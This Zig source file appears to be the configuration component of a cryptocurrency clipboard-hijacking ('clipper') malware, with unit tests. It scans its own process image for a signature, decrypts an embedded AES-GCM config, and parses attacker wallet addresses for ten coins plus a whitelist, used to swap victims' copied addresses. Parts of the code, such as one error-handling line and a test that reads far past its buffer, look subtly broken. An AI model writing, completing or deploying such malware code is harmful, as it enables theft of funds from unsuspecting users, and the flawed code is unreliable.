const std = @import("std");
const aes_gcm_bcrypt = @import("../crypto/aes_gcm_bcrypt.zig");

const CONFIG_SIG: []const u8 = "CLIPLZCFG";
const KEY_SIZE: usize = 32;
const NONCE_SIZE: usize = 12;
const TAG_SIZE: usize = 16;

pub const ClipperConfigData = struct {
    btc: []const u8,
    eth: []const u8,
    trx: []const u8,
    sol: []const u8,
    ltc: []const u8,
    xmr: []const u8,
    doge: []const u8,
    bch: []const u8,
    xrp: []const u8,
    ada: []const u8,
    whitelist: [][]const u8,
};

pub fn decryptConfig(image_base: usize, allocator: std.mem.Allocator) ?[]u8 {
    const sig_bytes = CONFIG_SIG;
    var offset: usize = 0;
    while (offset < 1024 * 1024) {
        const ptr = @as([*]const u8, @ptrFromInt(image_base + offset));
        var match = true;
        for (sig_bytes, 0..) |c, j| {
            if (ptr[j] != c) {
                match = false;
                break;
            }
        }
        if (match) {
            const data = @as([*]const u8, @ptrFromInt(image_base + offset + sig_bytes.len))[0..2048];
            return decryptConfigData(data, allocator);
        }
        offset += 1;
    }
    return null;
}

fn decryptConfigData(data: []const u8, allocator: std.mem.Allocator) ?[]u8 {
    if (data.len < KEY_SIZE + NONCE_SIZE + TAG_SIZE) return null;

    const key = data[0..KEY_SIZE];
    const nonce = data[KEY_SIZE..][0..NONCE_SIZE];
    const tag = data[KEY_SIZE + NONCE_SIZE ..][0..TAG_SIZE];
    const ciphertext = data[KEY_SIZE + NONCE_SIZE + TAG_SIZE ..];

    var key_arr: [32]u8 = undefined;
    var nonce_arr: [12]u8 = undefined;
    var tag_arr: [16]u8 = undefined;
    @memcpy(&key_arr, key);
    @memcpy(&nonce_arr, nonce);
    @memcpy(&tag_arr, tag);

    const out = allocator.alloc(u8, ciphertext.len) catch return null;
    const result = aes_gcm_bcrypt.decrypt(ciphertext, key_arr, nonce_arr, tag_arr, "", out) catch {
        allocator.free(out);
        return null;
    };
    _ = result;
    return out;
}

pub fn parseConfig(json_data: []const u8, allocator: std.mem.Allocator) ?ClipperConfigData {
    // Very simple JSON parser for our known config format
    // Expects: { "btc":"addr1","eth":"addr2",...,"whitelist":["a","b"] }

    var result = ClipperConfigData{
        .btc = "",
        .eth = "",
        .trx = "",
        .sol = "",
        .ltc = "",
        .xmr = "",
        .doge = "",
        .bch = "",
        .xrp = "",
        .ada = "",
        .whitelist = &.{},
    };

    var pos: usize = 0;
    while (pos < json_data.len) {
        // Skip whitespace and control chars
        while (pos < json_data.len and json_data[pos] <= ' ') : (pos += 1) {}

        if (pos >= json_data.len) break;

        if (json_data[pos] == '{' or json_data[pos] == '}' or json_data[pos] == ',' or json_data[pos] == '[' or json_data[pos] == ']') {
            pos += 1;
            continue;
        }

        // Parse key
        if (json_data[pos] != '"') {
            pos += 1;
            continue;
        }
        pos += 1;
        const key_start = pos;
        while (pos < json_data.len and json_data[pos] != '"') : (pos += 1) {}
        if (pos >= json_data.len) break;
        const key = json_data[key_start..pos];
        pos += 1; // skip closing quote

        // Skip colon
        while (pos < json_data.len and json_data[pos] <= ' ') : (pos += 1) {}
        if (pos >= json_data.len or json_data[pos] != ':') continue;
        pos += 1;
        while (pos < json_data.len and json_data[pos] <= ' ') : (pos += 1) {}

        if (pos >= json_data.len) break;

        // Parse value
        if (json_data[pos] == '"') {
            pos += 1;
            const val_start = pos;
            while (pos < json_data.len and json_data[pos] != '"') : (pos += 1) {}
            const val = json_data[val_start..pos];
            pos += 1;

            const val_copy = allocator.dupe(u8, val) catch continue;
            inline for (.{ "btc", "eth", "trx", "sol", "ltc", "xmr", "doge", "bch", "xrp", "ada" }) |field| {
                if (std.mem.eql(u8, key, field)) {
                    @field(result, field) = val_copy;
                }
            }
        } else if (json_data[pos] == '[') {
            // Array parsing for whitelist
            pos += 1;
            var list = std.ArrayList([]const u8).init(allocator);
            while (pos < json_data.len and json_data[pos] != ']') {
                while (pos < json_data.len and json_data[pos] <= ' ') : (pos += 1) {}
                if (pos >= json_data.len or json_data[pos] == ']') break;
                if (json_data[pos] == ',') {
                    pos += 1;
                    continue;
                }
                if (json_data[pos] == '"') {
                    pos += 1;
                    const item_start = pos;
                    while (pos < json_data.len and json_data[pos] != '"') : (pos += 1) {}
                    const item = json_data[item_start..pos];
                    pos += 1;
                    const item_copy = allocator.dupe(u8, item) catch {};
                    if (item_copy.len > 0) list.append(item_copy) catch {};
                } else {
                    pos += 1;
                }
            }
            result.whitelist = list.toOwnedSlice() catch &.{};
        }
    }

    return result;
}

test "decryptConfig no signature returns null" {
    const result = decryptConfig(@intFromPtr(&[_]u8{0} ** 100), std.testing.allocator);
    try std.testing.expect(result == null);
}

test "parseConfig minimal JSON" {
    const json = "{ \"btc\":\"bc1abc\", \"eth\":\"0xdef\" }";
    const config = parseConfig(json, std.testing.allocator) orelse return error.TestFailed;
    defer std.testing.allocator.free(config.btc);
    defer std.testing.allocator.free(config.eth);
    try std.testing.expectEqualStrings("bc1abc", config.btc);
    try std.testing.expectEqualStrings("0xdef", config.eth);
}

test "parseConfig with whitelist" {
    const json = "{ \"btc\":\"bc1x\", \"whitelist\":[\"addr1\",\"addr2\"] }";
    const config = parseConfig(json, std.testing.allocator) orelse return error.TestFailed;
    defer std.testing.allocator.free(config.btc);
    for (config.whitelist) |w| std.testing.allocator.free(w);
    std.testing.allocator.free(config.whitelist);
    try std.testing.expectEqualStrings("bc1x", config.btc);
    try std.testing.expectEqual(@as(usize, 2), config.whitelist.len);
    try std.testing.expectEqualStrings("addr1", config.whitelist[0]);
}
